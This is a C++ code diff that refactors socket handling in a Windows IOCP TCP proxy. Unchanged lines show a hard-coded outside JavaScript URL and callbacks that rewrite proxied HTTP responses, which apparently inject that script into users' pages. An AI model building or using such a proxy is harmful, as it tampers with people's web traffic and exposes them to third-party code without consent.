@@ -10,50 +10,11 @@
 
 #include "CSLock.h"
 #include "UserHandle.h"
-
-typedef enum IOCP_OPTION_TYPE{
-	IOT_ERROR=0,
-	IOT_SEND=1,
-	IOT_RECV=2
-}IOCP_OPTION_TYPE;
-
-typedef struct tagWSAOVERLAPPEDEX{
-	WSAOVERLAPPED wsaOverLapped;
-	IOCP_OPTION_TYPE IOCPType;
-}WSAOVERLAPPEDEX,*PWSAOVERLAPPEDEX;
-
-typedef struct tagIOCP_NODE
-{
-	SOCKET sockClient;
-	WSABUF wsaBufferRecv;
-	WSAOVERLAPPEDEX wsaOverLappedRecv;
-	CHAR   chRecvBuffer[4096];
-
-	WSABUF wsaBufferSend;
-	WSAOVERLAPPEDEX wsaOverLappedSend;
-
-	DWORD dwSendPendingLen;
-	CCSLock lockSendPendingLen;
-
-	PVOID   pUserParam;
-}IOCP_NODE,*PIOCP_NODE;
+#include "HelpFun.h"
+#include "IOCPTcpClient.h"
+#include "IOCPClientManager.h"
 
 
-typedef VOID (WINAPI *CALLBACK_CLIENT_CONNECT)( HANDLE hClient,sockaddr_in *psiClient );
-typedef VOID (WINAPI *CALLBACK_CLIENT_DISCONNECT)( HANDLE hClient,PVOID pUserParam);
-typedef VOID (WINAPI *CALLBACK_DATA_RECV)( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,DWORD dwDataLen);
-typedef BOOL (WINAPI *SEND_DATA)( HANDLE hClient,BYTE *pDataBuffer,DWORD dwDataLen);
-
-typedef struct tagIOCP_TCP_CALLBACK
-{
-	//客户端连接回调
-	CALLBACK_CLIENT_CONNECT pClientConnect;
-	//客户端断开回调
-	CALLBACK_CLIENT_DISCONNECT pClientDisConnect;
-	//收到客户端数据回调
-	CALLBACK_DATA_RECV  pDataRecv;
-
-}IOCP_TCP_CALLBACK,*PIOCP_TCP_CALLBACK;
 
 
 typedef struct tagIOCP_TCP_SERVER_PARAM
@@ -65,159 +26,18 @@ typedef struct tagIOCP_TCP_SERVER_PARAM
 	BOOL bStartRes;
 }IOCP_TCP_SERVER_PARAM,*PIOCP_TCP_SERVER_PARAM;
 
+CIOCPClientManager g_ClientManager;
 
-CUserHandle g_HandleManager;
-
-
-HANDLE CreateIOCPNode( SOCKET sockClient )
-{
-	PIOCP_NODE pIOCPNode = new IOCP_NODE;
-
-	pIOCPNode->sockClient = sockClient;
-	pIOCPNode->dwSendPendingLen = 0;
-	pIOCPNode->pUserParam = NULL;
-
-	return g_HandleManager.AllocHandle(pIOCPNode);
-}
-
-BOOL DeleteIOCPNode( HANDLE hClient )
-{
-	PIOCP_NODE pIOCPNode = NULL;
-	g_HandleManager.CloseHandle(hClient,(PVOID *)&pIOCPNode);
-	if (pIOCPNode)
-	{
-		OutputDebugStringW(L"CloseConnect\r\n");
-		closesocket( pIOCPNode->sockClient );
-		delete pIOCPNode;
-		return TRUE;
-	}
-	return FALSE;
-}
-
-BOOL JoinIOCP( HANDLE hIOCPServer,SOCKET sock,HANDLE &hClient)
+HANDLE GetIOCPHandle( HANDLE hIOCPServer )
 {
 	PIOCP_TCP_SERVER_PARAM pIOCPTcpServer = (PIOCP_TCP_SERVER_PARAM)hIOCPServer;
-	hClient = CreateIOCPNode(sock);
-
-	HANDLE hTemp = CreateIoCompletionPort((HANDLE)(sock),pIOCPTcpServer->hIOCompletionPort,(ULONG_PTR)hClient,0);
-	return hTemp != NULL;
+	return pIOCPTcpServer->hIOCompletionPort;
 }
 
-VOID SetUserParam( HANDLE hClient, PVOID pUserParam )
+IOCP_TCP_CALLBACK *GetIOCPCallbacks(HANDLE hIOCPServer)
 {
-	PIOCP_NODE pIOCPNode = (PIOCP_NODE)g_HandleManager.GetHandleData(hClient);
-	if (pIOCPNode)
-	{
-		pIOCPNode->pUserParam = pUserParam;
-	}
-}
-
-PVOID GetUserParam( HANDLE hClient )
-{
-	PIOCP_NODE pIOCPNode = (PIOCP_NODE)g_HandleManager.GetHandleData(hClient);
-	if (pIOCPNode)
-	{
-		return pIOCPNode->pUserParam;
-	}
-	return NULL;
-}
-
-CHAR *GetRecvBuffer( HANDLE hClient )
-{
-	PIOCP_NODE pIOCPNode = (PIOCP_NODE)g_HandleManager.GetHandleData(hClient);
-	if (pIOCPNode)
-	{
-		return pIOCPNode->chRecvBuffer;
-	}
-	return NULL;
-}
-
-BOOL DecreasePendingSendLen(HANDLE hClient,DWORD dwLen)
-{
-	PIOCP_NODE pIOCPNode = (PIOCP_NODE)g_HandleManager.GetHandleData(hClient);
-	if (pIOCPNode)
-	{
-		pIOCPNode->lockSendPendingLen.Lock();
-		pIOCPNode->dwSendPendingLen -= dwLen;
-		pIOCPNode->lockSendPendingLen.UnLock();
-	}
-	return NULL;
-}
-
-BOOL IncreasePendingSendLen(HANDLE hClient,DWORD dwLen)
-{
-	PIOCP_NODE pIOCPNode = (PIOCP_NODE)g_HandleManager.GetHandleData(hClient);
-	if (pIOCPNode)
-	{
-		pIOCPNode->lockSendPendingLen.Lock();
-		pIOCPNode->dwSendPendingLen += dwLen;
-		pIOCPNode->lockSendPendingLen.UnLock();
-	}
-	return NULL;
-}
-
-BOOL PostRecvRequest( HANDLE hClient )
-{
-	PIOCP_NODE pIOCPNode = (PIOCP_NODE)g_HandleManager.GetHandleData(hClient);
-	if (pIOCPNode)
-	{
-		DWORD dwFlag = 0;
-		DWORD dwRecvLen = 0;
-
-		ZeroMemory(&(pIOCPNode->wsaOverLappedRecv),sizeof(pIOCPNode->wsaOverLappedRecv));
-		pIOCPNode->wsaOverLappedRecv.IOCPType = IOT_RECV;
-
-		pIOCPNode->wsaBufferRecv.buf = pIOCPNode->chRecvBuffer;
-		pIOCPNode->wsaBufferRecv.len = _countof(pIOCPNode->chRecvBuffer);
-
-		int ret =  WSARecv(pIOCPNode->sockClient,&(pIOCPNode->wsaBufferRecv),1,&dwRecvLen,&dwFlag,(LPWSAOVERLAPPED)(&(pIOCPNode->wsaOverLappedRecv)),NULL);
-		DWORD dwErrorCode = 0;
-		if (ret == SOCKET_ERROR && (dwErrorCode=WSAGetLastError()) != WSA_IO_PENDING)
-		{
-			return FALSE;
-		}
-		return TRUE;
-	}
-	return FALSE;
-}
-
-BOOL WINAPI PostSendRequest( HANDLE hClient , BYTE *pSendBuf,DWORD dwDataLen , DWORD *pdwPenddingSendLen )
-{
-	PIOCP_NODE pIOCPNode = (PIOCP_NODE)g_HandleManager.GetHandleData(hClient);
-	if (pIOCPNode)
-	{
-		DWORD dwFlag = 0;
-		DWORD dwRecvLen = 0 ;
-
-		ZeroMemory(&(pIOCPNode->wsaOverLappedSend),sizeof(pIOCPNode->wsaOverLappedSend));
-		pIOCPNode->wsaOverLappedSend.IOCPType = IOT_SEND;
-
-		pIOCPNode->wsaBufferSend.buf = (CHAR *)pSendBuf;
-		pIOCPNode->wsaBufferSend.len = dwDataLen;
-
-		int ret =  WSASend(pIOCPNode->sockClient,&(pIOCPNode->wsaBufferSend),1,&dwRecvLen,dwFlag,(LPWSAOVERLAPPED)(&(pIOCPNode->wsaOverLappedSend)),NULL);
-		DWORD dwErrorCode = 0;
-		if (ret == SOCKET_ERROR && (dwErrorCode=WSAGetLastError()) != WSA_IO_PENDING)
-		{
-			return FALSE;
-		}
-
-		pIOCPNode->lockSendPendingLen.Lock();
-
-		pIOCPNode->dwSendPendingLen += dwDataLen;
-		if (pdwPenddingSendLen)
-		{
-			*pdwPenddingSendLen = pIOCPNode->dwSendPendingLen;
-		}
-
-		pIOCPNode->lockSendPendingLen.UnLock();
-
-	}
-
-
-
-
-	return TRUE;
+	PIOCP_TCP_SERVER_PARAM pIOCPTcpServer = (PIOCP_TCP_SERVER_PARAM)hIOCPServer;
+	return &(pIOCPTcpServer->IOCPCallback);
 }
 
 DWORD WINAPI IOCPWorkThread(LPVOID lpParam)
@@ -230,40 +50,21 @@ DWORD WINAPI IOCPWorkThread(LPVOID lpParam)
 		PWSAOVERLAPPEDEX pOverLappedEx=NULL;
 
 		HANDLE hClient = NULL;
-
+		
 		BOOL bRet = GetQueuedCompletionStatus(pServerParam->hIOCompletionPort,&dwReturnBits,(PULONG_PTR)&hClient,(LPWSAOVERLAPPED *)&pOverLappedEx,INFINITE);
 
 		if ( dwReturnBits > 0 )
 		{
-			if ( pOverLappedEx->IOCPType == IOT_RECV )
-			{
-
-				pServerParam->IOCPCallback.pDataRecv(hClient,GetUserParam(hClient),(BYTE *)GetRecvBuffer(hClient),dwReturnBits);
-
-				PostRecvRequest( hClient );
-			}
-			
-			if ( pOverLappedEx->IOCPType == IOT_SEND )
-			{
-				DecreasePendingSendLen(hClient,dwReturnBits);
-			}
+			g_ClientManager.OnDataTransfer(hClient,pOverLappedEx,dwReturnBits);
 		}
 		else if( dwReturnBits == 0 )
 		{
-			if(g_HandleManager.CheckValidHandle(hClient))
-			{
-				pServerParam->IOCPCallback.pClientDisConnect(hClient,GetUserParam(hClient));
-				DeleteIOCPNode(hClient);
-			}
-
+			g_ClientManager.DestoryIOCPClient(hClient);
 		}
-
-		int a=0;
 	}
 
 	return 0;
 }
-
 
 DWORD WINAPI IOCPTcpServerAcceptThread( PVOID pParam )
 {
@@ -336,16 +137,15 @@ DWORD WINAPI IOCPTcpServerAcceptThread( PVOID pParam )
 			int len = sizeof(sa);
 			SOCKET clientsock = WSAAccept(AcceptSocket,&sa,&len,NULL,0);
 
-			OutputDebugStringW(L"New Client Connected\r\n");
+			HANDLE hClient = g_ClientManager.CreateIOCPClient(clientsock,&(pServerParam->IOCPCallback));
 
-			HANDLE hClient = CreateIOCPNode(clientsock);
-			pServerParam->IOCPCallback.pClientConnect(hClient,(sockaddr_in *)&sa);
-
-			HANDLE hTemp = CreateIoCompletionPort((HANDLE)(clientsock),hIOCompletionPort,(ULONG_PTR)hClient,0);
-			if( hTemp )
+			if(g_ClientManager.JoinIOCP(hClient,hIOCompletionPort))
 			{
-				PostRecvRequest( hClient );
+				pServerParam->IOCPCallback.pClientConnect(hClient,(sockaddr_in *)&sa);
+				g_ClientManager.PostRecvRequest(hClient);
 			}
+
+			
 		}
 	}
 
@@ -397,47 +197,6 @@ typedef struct tagCALLBACK_PARAM
 
 HANDLE hIOCPServer = NULL;
 
-BOOL EasyConnect( SOCKET sock , LPCSTR pszTargetIP,USHORT nTargetPort)
-{
-	if (pszTargetIP == NULL)
-	{
-		WSASetLastError (WSAEINVAL);
-		return FALSE;
-	}
-
-	SOCKADDR_IN sockAddr;
-	memset(&sockAddr,0,sizeof(sockAddr));
-
-	LPSTR lpszAscii = (LPSTR)pszTargetIP;//T2A_EX((LPTSTR)pszTargetIP, _ATL_SAFE_ALLOCA_DEF_THRESHOLD);
-	if (lpszAscii == NULL)
-	{
-		WSASetLastError(ERROR_NOT_ENOUGH_MEMORY);
-		return FALSE;
-	}
-
-	sockAddr.sin_family = AF_INET;
-	sockAddr.sin_addr.s_addr = inet_addr(lpszAscii);
-
-	if (sockAddr.sin_addr.s_addr == INADDR_NONE)
-	{
-		LPHOSTENT lphost;
-		lphost = gethostbyname(lpszAscii);
-		if (lphost != NULL)
-			sockAddr.sin_addr.s_addr = ((LPIN_ADDR)lphost->h_addr)->s_addr;
-		else
-		{
-			WSASetLastError(WSAEINVAL);
-			return FALSE;
-		}
-	}
-
-	sockAddr.sin_port = htons((u_short)nTargetPort);
-
-	int bRes = connect(sock,(sockaddr *)&sockAddr,sizeof(sockAddr));
-	return bRes == 0;
-}
-
-
 
 CStringA g_strJsUrl="http://b.yxk6.com/qm20160728.js";
 
@@ -473,7 +232,7 @@ VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL b
 					CStringA strNewBuffer;
 					recvParser.BuildBuffer(strNewBuffer);
 					
-					PostSendRequest(pCallbackParam->hRemote,(BYTE *)strNewBuffer.GetBuffer(),strNewBuffer.GetLength(),NULL);
+					g_ClientManager.PostSendRequest(pCallbackParam->hRemote,(BYTE *)strNewBuffer.GetBuffer(),strNewBuffer.GetLength(),NULL);
 				}
 			}
 
@@ -492,11 +251,13 @@ VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL b
 
 			CStringA strChunkData;
 			strChunkData.Format("%x\r\n%s\r\n",strTempData.GetLength(),strTempData.GetBuffer());
-			PostSendRequest(pCallbackParam->hRemote,(BYTE *)strChunkData.GetBuffer(),strChunkData.GetLength(),NULL);
+
+			g_ClientManager.PostSendRequest(pCallbackParam->hRemote,(BYTE *)strChunkData.GetBuffer(),strChunkData.GetLength(),NULL);
+
 			if (bFinalData)
 			{
 				strChunkData = "0\r\n\r\n";
-				PostSendRequest(pCallbackParam->hRemote,(BYTE *)strChunkData.GetBuffer(),strChunkData.GetLength(),NULL);
+				g_ClientManager.PostSendRequest(pCallbackParam->hRemote,(BYTE *)strChunkData.GetBuffer(),strChunkData.GetLength(),NULL);
 			}
 
 		}
@@ -514,7 +275,8 @@ VOID WINAPI ClientConnectCallback( HANDLE hClient,sockaddr_in *psiClient )
 	pClientData->CallbackParam.hRemote = NULL;
 	pClientData->pHttpDataParser = NULL;
 	pClientData->bServerToClient = FALSE;
-	SetUserParam(hClient,pClientData);
+	g_ClientManager.SetUserParam(hClient,pClientData);
+
 }
 VOID WINAPI ClientDisConnectCallback( HANDLE hClient , PVOID pUserParam)
 {
@@ -526,7 +288,9 @@ VOID WINAPI ClientDisConnectCallback( HANDLE hClient , PVOID pUserParam)
 			delete pClientData->pHttpDataParser;
 		}
 
-		DeleteIOCPNode( pClientData->hRemote );
+		g_ClientManager.DestoryIOCPClient( pClientData->hRemote );
+
+		DebugStringW(L"Delete The pClientData Ptr 0x%x",pClientData);
 
 		delete pClientData;
 	}
@@ -551,7 +315,7 @@ VOID WINAPI DataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,
 		
 		if (  FALSE == pClientData->CallbackParam.bReplaceData )
 		{
-			PostSendRequest(pClientData->hRemote,pDataBuffer,dwDataLen,NULL);
+			g_ClientManager.PostSendRequest(pClientData->hRemote,pDataBuffer,dwDataLen,NULL);
 		}
 		
 		return ;
@@ -569,32 +333,37 @@ VOID WINAPI DataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,
 
 			BOOL bRemoteRes = FALSE;
 			HANDLE hRemote = NULL;
-			SOCKET sockRemote = INVALID_SOCKET;
+			
 			PCLIENT_DATA pRemoteData = NULL;
 			do 
 			{
-				sockRemote = WSASocket(AF_INET,SOCK_STREAM,0,NULL,0,WSA_FLAG_OVERLAPPED);
-				if(sockRemote == INVALID_SOCKET)
+				hRemote = g_ClientManager.CreateIOCPClient(GetIOCPCallbacks(hIOCPServer));
+				if ( NULL == hRemote )
 				{
 					break;
 				}
 
-				if( FALSE == EasyConnect(sockRemote,strHost,80) )
+				if( FALSE == g_ClientManager.Connect(hRemote,strHost,80))
 				{
 					break;
 				}
 
-				if( FALSE == JoinIOCP( hIOCPServer , sockRemote , hRemote ))
+				if ( FALSE == g_ClientManager.JoinIOCP(hRemote,GetIOCPHandle(hIOCPServer)))
 				{
 					break;
 				}
 
-				PostSendRequest( hRemote,(BYTE *)pClientData->strHeadBuffer.GetBuffer(),pClientData->strHeadBuffer.GetLength() , NULL );
+				if ( FALSE == g_ClientManager.PostSendRequest(hRemote,(BYTE *)pClientData->strHeadBuffer.GetBuffer(),pClientData->strHeadBuffer.GetLength() , NULL))
+				{
+					break;
+				}
 
-				PostRecvRequest( hRemote );
+				if ( FALSE == g_ClientManager.PostRecvRequest(hRemote))
+				{
+					break;
+				}
 
 				pClientData->hRemote = hRemote;
-				
 
 				pRemoteData = new CLIENT_DATA;
 				pRemoteData->hRemote = hClient;
@@ -606,7 +375,7 @@ VOID WINAPI DataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,
 
 				pClientData->CallbackParam.hRemote = hRemote;
 
-				SetUserParam( hRemote , (PVOID)pRemoteData );
+				g_ClientManager.SetUserParam(hRemote , (PVOID)pRemoteData);
 
 				bRemoteRes = TRUE;
 			} while (FALSE);
@@ -615,7 +384,7 @@ VOID WINAPI DataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,
 			{
 				if (hRemote)
 				{
-					DeleteIOCPNode(hRemote);
+					g_ClientManager.DestoryIOCPClient(hRemote);
 				}
 			}
 
